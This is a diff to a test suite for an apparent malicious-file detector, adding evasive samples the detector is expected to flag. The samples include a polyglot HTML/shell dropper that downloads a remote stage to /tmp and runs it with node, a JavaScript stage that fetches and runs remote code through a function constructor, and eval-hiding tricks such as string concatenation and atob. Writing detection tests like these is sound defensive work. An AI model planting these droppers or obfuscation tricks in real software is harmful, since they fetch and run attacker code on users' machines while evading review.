@@ -135,6 +135,35 @@ REVIEWED_THIRD = {
     ),
 }
 
+# The fourth review round: a polyglot whose first line is a <b> tag with a `src` attribute, which a
+# shell runs as a Python here-document and node, and the stage it fetches, which builds a function
+# through the constructor of an arrow.
+POLYGLOT = (
+    b'<b x\nsrc="' + URL + b'/s2.js"\npython3 - "$src" <<\'E\'\nimport sys,urllib.request as r\n'
+    b'open("/tmp/s","wb").write(r.urlopen(sys.argv[1]).read())\nE\nnode /tmp/s\n'
+)
+STAGE_CONSTRUCTOR = b'fetch("' + URL + b'/s3").then(r=>r.text()).then(t=>(()=>0).constructor(t)())'
+REVIEWED_FOURTH = {
+    "polyglot": POLYGLOT,
+    "stage built by a constructor": STAGE_CONSTRUCTOR,
+    "stage built by a constructor, strict": b'"use strict";' + STAGE_CONSTRUCTOR,
+    "env sh": b"<p x\nenv sh -s < /run/a\n",
+    "env bash": b"<p x\n/usr/bin/env bash /run/a\n",
+    "bash from a file": b"<p x\nbash</run/a\n",
+    "sh here-document": b"<p x\nsh <<'E'\nid\nE\n",
+    "ksh": b"<p x\nksh /run/a\n",
+    "zsh -c": b"<p x\nzsh -c id\n",
+    "dash": b"<p x\ndash /run/a\n",
+    "constructor by brackets": b'"use strict";var x=[]["filter"]["constructor"](d)();',
+    "constructor of a constructor": b'"use strict";var f=g.constructor.constructor(d);f();',
+    "window lookup by concatenation": b'"use strict";var e=window["ev"+"al"];e(d);',
+    "self lookup by a variable": b'"use strict";var e=self[a+b];e(d);',
+    "globalThis lookup by atob": b'"use strict";globalThis[atob("ZXZhbA==")](d);',
+    "perl from its input": b"<p x\nperl - <<'E'\nprint 1\nE\n",
+    "python here-document": b"<p x\npython3 <<E\nprint(1)\nE\n",
+    "node by path": b"<p x\nnode /tmp/s\n",
+}
+
 # Payloads that need no particular word in common, wrapped in each disguise below.
 PAYLOADS = {
     "shell dropper": DROPPER,
@@ -181,6 +210,14 @@ PAYLOADS = {
     "eval of a variable": b"eval(d)",
     "new Function": b"new Function(d)()",
     "node write": b'require(m).writeFile("/tmp/x", d)',
+    # Fourth round: one payload per new sign, each alone.
+    "env sh": b"env sh /run/a",
+    "bash redirection": b"bash < /run/a",
+    "zsh": b"zsh -c id",
+    "arrow constructor": b"(()=>0).constructor(d)()",
+    "window concatenation": b'window["ev"+"al"](d)',
+    "python from its input": b"python3 - <<E",
+    "perl from its input": b"perl - x",
 }
 DISGUISES = {
     "html": b"<!doctype html><html><head><title>t</title></head><body>hi</body></html>\n",
@@ -208,6 +245,30 @@ def test_third_round_cases_keep_a_non_web_kind(name: str, rules: CompiledRules) 
     assert identify(REVIEWED_THIRD[name]).kind not in WEB_KINDS, name
     result = analyze(REVIEWED_THIRD[name], rules=rules)
     assert result.severity != "info", name
+
+
+@pytest.mark.parametrize("name", sorted(REVIEWED_FOURTH))
+def test_fourth_round_cases_keep_a_non_web_kind(name: str, rules: CompiledRules) -> None:
+    assert identify(REVIEWED_FOURTH[name]).kind not in WEB_KINDS, name
+    assert analyze(REVIEWED_FOURTH[name], rules=rules).severity != "info", name
+
+
+def test_the_polyglot_chain_keeps_every_next_stage(rules: CompiledRules) -> None:
+    first = analyze(POLYGLOT, rules=rules)
+    assert [(i.value, i.source) for i in first.iocs if i.kind == "next_url"] == [
+        (URL.decode() + "/s2.js", "script_url")
+    ]
+    second = analyze(STAGE_CONSTRUCTOR, rules=rules)
+    assert [(i.value, i.source) for i in second.iocs if i.kind == "next_url"] == [
+        (URL.decode() + "/s3", "script_url")
+    ]
+
+
+def test_words_next_to_a_tag_are_not_a_shell() -> None:
+    page = b"<!doctype html><html><body><p>Use <b>Bash</b> or bash <br> today.</p></body></html>"
+    assert identify(page).kind == "html"
+    bundle = b'"use strict";var w=window["webpackJsonp"]=window["webpackJsonp"]||[];var f=()=>w;'
+    assert identify(bundle).kind == "javascript"
 
 
 def test_the_node_stage_two_keeps_its_next_stage(rules: CompiledRules) -> None:
